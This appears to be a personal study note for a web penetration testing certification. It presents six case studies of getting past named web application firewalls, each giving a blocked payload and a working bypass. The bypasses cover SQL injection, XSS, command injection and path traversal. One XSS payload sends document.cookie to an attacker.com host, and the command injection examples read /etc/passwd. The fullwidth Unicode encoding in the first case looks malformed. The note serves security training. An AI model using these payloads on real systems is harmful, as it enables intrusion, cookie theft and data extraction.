2026-02-06

Status:

Tags: [[eWPTX]] [[Bypassing Filters & Evasion]]
###### Prerequisites: [[WAF Bypass Payloads & Techniques]]
# Filter Bypass Case Studies

## Case 1: Cloudflare SQLi Bypass via Unicode Normalization

**Context**: Cloudflare WAF blocking standard UNION SELECT payloads.

**Technique**: Use Unicode fullwidth characters. Cloudflare's regex didn't match fullwidth variants, but the MySQL backend normalized them.

```
# Blocked
id=1' UNION SELECT 1,2,3--

# Bypass using fullwidth
id=1'%EF%BC%BUNION%EF%BC%BSELECT%EF%BC%B1,2,3--
```

**Lesson**: WAF regex operates on raw bytes; the backend may normalize Unicode before query execution.

---

## Case 2: ModSecurity CRS SQLi Bypass via Comment Nesting

**Context**: ModSecurity with OWASP Core Rule Set (CRS) v3.x, paranoia level 1.

**Technique**: MySQL version-conditional comments bypass keyword detection.

```sql
# Blocked by CRS
' UNION SELECT password FROM users--

# Bypass: version comments
' /*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ users--
```

**Why it works**: CRS rules check for `UNION\s+SELECT` pattern. The version comments break the expected whitespace sequence. MySQL treats `/*!50000...*/` as executable code on versions >= 5.0.

**Lesson**: Understand the regex pattern the rule uses, then break the expected token sequence.

---

## Case 3: AWS WAF XSS Bypass via SVG

**Context**: AWS WAF managed XSS rule blocking `<script>` tags.

**Technique**: Use SVG elements which aren't covered by the default managed rule.

```html
# Blocked
<script>alert(document.cookie)</script>

# Bypass
<svg/onload=fetch('https://attacker.com/?c='+document.cookie)>
```

**Lesson**: Managed rulesets often focus on the most common vectors. Alternative HTML elements with event handlers provide bypass paths.

---

## Case 4: Imperva Command Injection Bypass via $IFS

**Context**: Imperva WAF blocking commands with spaces.

**Technique**: Replace spaces with `$IFS` (bash Internal Field Separator).

```bash
# Blocked
; cat /etc/passwd

# Bypass
;cat$IFS/etc/passwd

# Further obfuscation
;c\at$IFS/e?c/p*ss*d
```

**Lesson**: Bash is extremely flexible with quoting and expansion. Glob patterns and variable expansion provide many ways to construct commands without triggering keyword filters.

---

## Case 5: Akamai SQLi Bypass via Chunked Transfer Encoding

**Context**: Akamai WAF inspecting request body as a single buffer.

**Technique**: Use chunked Transfer-Encoding to split the payload across chunks.

```http
POST /search HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

3
q=1
4
' UN
5
ION S
6
ELECT
9
 passwo
6
rd FRO
7
M users
1
-
2
-
0
```

**Why it works**: The WAF inspects individual chunks but doesn't reassemble the full body before pattern matching.

**Lesson**: Protocol-level features (chunked encoding, HTTP/2 streams) can split payloads below the WAF's reassembly threshold.

---

## Case 6: Double Encoding Path Traversal

**Context**: Application with a WAF that URL-decodes once before checking for `../`.

**Technique**: Double-encode the traversal characters.

```
# Blocked (WAF decodes %2e%2e%2f to ../)
GET /files?path=%2e%2e%2fetc/passwd

# Bypass (WAF decodes once to %2e%2e%2f, doesn't see ../)
GET /files?path=%252e%252e%252fetc/passwd
```

**The app**: Decodes a second time, producing the original `../etc/passwd`.

**Lesson**: Count the number of decode passes between WAF and application. Each intermediate proxy/layer may add another decode step.

---

## Key Takeaways

1. **Know your target**: Different WAFs have fundamentally different architectures
2. **Understand the decode chain**: Map every transformation from client to backend
3. **Break patterns, not logic**: Focus on disrupting the WAF's regex without changing the payload's meaning to the backend
4. **Layer techniques**: Combine encoding + case manipulation + comments for resilience
5. **Test incrementally**: Start simple, add complexity only as needed
6. **Document everything**: Record what works — the same bypass rarely works twice after disclosure
